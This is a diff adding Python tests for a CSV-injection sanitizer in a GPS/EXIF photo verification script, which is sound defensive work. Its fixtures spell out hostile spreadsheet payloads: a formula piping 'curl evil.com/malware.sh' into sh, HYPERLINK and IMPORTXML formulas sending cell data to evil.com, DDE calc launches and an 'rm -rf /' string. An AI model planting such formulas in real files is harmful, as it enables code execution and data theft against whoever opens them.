@@ -729,3 +729,197 @@ def test_extract_timestamp_year_range():
         timestamp = extract_timestamp_from_filename(filename)
         assert timestamp is not None, f"Failed to parse year: {year}"
         assert timestamp.year == year
+
+
+# ============================================================================
+# Test: sanitize_csv_value() - CSV Injection Prevention
+# ============================================================================
+
+def test_sanitize_csv_value_formula_prefix():
+    """Test that CSV formula prefixes are escaped."""
+    from scripts.verify_gps_exif import sanitize_csv_value
+
+    # Test all dangerous prefixes that spreadsheet apps interpret as formulas
+    # Note: Numeric values like "+123" or "-123" are NOT escaped (they're safe numbers)
+    dangerous_values = [
+        "=SUM(A1:A10)",          # Formula
+        "+command",              # Plus prefix with non-numeric text
+        "-command",              # Minus prefix with non-numeric text
+        "@SUM(A1:A10)",          # @ prefix (older Excel formula syntax)
+        "\t=malicious",          # Tab followed by formula
+        "+123abc",               # Starts with + but not a valid number
+        "-123abc",               # Starts with - but not a valid number
+    ]
+
+    for value in dangerous_values:
+        sanitized = sanitize_csv_value(value)
+        assert sanitized.startswith("'"), f"Should prefix '{value}' with single quote"
+        assert sanitized == "'" + value, f"Should be exactly \"'{value}\""
+
+
+def test_sanitize_csv_value_normal_text():
+    """Test that normal text is not modified."""
+    from scripts.verify_gps_exif import sanitize_csv_value
+
+    # Normal values that should NOT be escaped
+    normal_values = [
+        "mothbox_2025_01_15__12_30_45.jpg",
+        "OK",
+        "No GPS",
+        "Missing File",
+        "37.7749",
+        "-122.4194",
+        "2025-01-15 12:30:00",
+        "normal text with spaces",
+        "text-with-dashes",
+        "text_with_underscores",
+    ]
+
+    for value in normal_values:
+        sanitized = sanitize_csv_value(value)
+        assert sanitized == value, f"Should not modify normal value: {value}"
+
+
+def test_sanitize_csv_value_empty_string():
+    """Test that empty strings are handled correctly."""
+    from scripts.verify_gps_exif import sanitize_csv_value
+
+    assert sanitize_csv_value("") == ""
+    assert sanitize_csv_value(None) is None
+
+
+def test_sanitize_csv_value_numeric():
+    """Test that numeric values are handled correctly."""
+    from scripts.verify_gps_exif import sanitize_csv_value
+
+    # Numeric values (converted to strings) should NOT be escaped
+    assert sanitize_csv_value("123") == "123"
+    assert sanitize_csv_value("0") == "0"
+    assert sanitize_csv_value("3.14159") == "3.14159"
+
+    # Negative numbers should NOT be escaped (they're safe)
+    assert sanitize_csv_value("-122.4194") == "-122.4194"
+    assert sanitize_csv_value("-430.5") == "-430.5"
+    assert sanitize_csv_value("-1") == "-1"
+
+    # Positive numbers with + prefix should NOT be escaped (they're safe)
+    assert sanitize_csv_value("+1.5") == "+1.5"
+    assert sanitize_csv_value("+100") == "+100"
+    assert sanitize_csv_value("+0.001") == "+0.001"
+
+    # Scientific notation should NOT be escaped
+    assert sanitize_csv_value("1.5e-10") == "1.5e-10"
+    assert sanitize_csv_value("-3.2e+5") == "-3.2e+5"
+
+
+def test_sanitize_csv_value_injection_in_error_message():
+    """
+    Test sanitization of error messages that could contain injection.
+
+    Note: Only values that START with dangerous characters are escaped.
+    If the dangerous character is in the middle, it's safe because
+    spreadsheet apps only interpret formulas at the start of a cell.
+    """
+    from scripts.verify_gps_exif import sanitize_csv_value
+
+    # These messages start with safe text, so they won't be escaped
+    # (dangerous characters are in the middle, which is safe)
+    safe_error_messages = [
+        "Error: =SYSTEM('rm -rf /')",
+        "Error: +malicious_command",
+        "Error: File @evil.jpg not found",
+    ]
+
+    for error in safe_error_messages:
+        sanitized = sanitize_csv_value(error)
+        # Should NOT be escaped (starts with "Error:", not with dangerous char)
+        assert sanitized == error, f"Should not escape: {error}"
+
+    # These messages START with dangerous characters, so they WILL be escaped
+    dangerous_error_messages = [
+        "=SYSTEM('rm -rf /')",
+        "+malicious_command",
+        "@evil.jpg not found",
+        "\t=DDE()",
+    ]
+
+    for error in dangerous_error_messages:
+        sanitized = sanitize_csv_value(error)
+        # Should be escaped (starts with dangerous character)
+        assert sanitized.startswith("'"), f"Should escape error: {error}"
+        assert sanitized == "'" + error, f"Should be exactly \"'{error}\""
+
+
+def test_sanitize_csv_value_in_csv_generation(tmp_path):
+    """
+    Test that CSV generation applies sanitization to all fields.
+
+    This is an integration test that verifies sanitize_csv_value() is
+    actually used when generating CSV reports.
+    """
+    from scripts.verify_gps_exif import generate_csv_report
+    from pathlib import Path
+    import csv
+
+    # Create a fake photo with malicious filename
+    malicious_filename = "=malicious.jpg"
+    fake_photo = tmp_path / malicious_filename
+    fake_photo.write_text("not a real jpeg")
+
+    # Generate CSV report
+    output_csv = tmp_path / "test_report.csv"
+    generate_csv_report([fake_photo], output_csv)
+
+    # Read CSV and verify sanitization
+    with open(output_csv, 'r', encoding='utf-8') as f:
+        reader = csv.DictReader(f)
+        rows = list(reader)
+
+    assert len(rows) == 1
+    row = rows[0]
+
+    # Filename should be sanitized (prefixed with ')
+    assert row['filename'] == f"'{malicious_filename}", "Filename should be sanitized"
+
+    # Status should contain error message (file doesn't exist or isn't valid JPEG)
+    # Error message should also be sanitized if it contains dangerous prefixes
+    assert row['status'] != "", "Status should contain an error"
+
+
+def test_csv_injection_real_world_scenarios(tmp_path):
+    """
+    Test CSV injection prevention with real-world attack scenarios.
+
+    Scenarios tested:
+    1. DDE (Dynamic Data Exchange) attack
+    2. Remote code execution attempt
+    3. System command injection
+    4. Hyperlink injection
+    """
+    from scripts.verify_gps_exif import sanitize_csv_value
+
+    real_world_attacks = [
+        # DDE attack (older Excel vulnerability)
+        '=cmd|"/c calc"!A1',
+
+        # Remote code execution
+        '=SYSTEM("curl evil.com/malware.sh | sh")',
+
+        # Hyperlink injection
+        '=HYPERLINK("http://evil.com?data=" & A1, "Click me")',
+
+        # Command injection via formula
+        '+IMPORTXML(CONCAT("http://evil.com?data=", A1), "//a")',
+
+        # Tab-prefixed DDE
+        '\t@SUM(A1:A10)|calc.exe!A1',
+    ]
+
+    for attack in real_world_attacks:
+        sanitized = sanitize_csv_value(attack)
+
+        # All attacks should be escaped with leading quote
+        assert sanitized.startswith("'"), f"Attack not sanitized: {attack}"
+
+        # Verify the original dangerous content is preserved but escaped
+        assert sanitized == "'" + attack, f"Sanitization modified content: {attack}"
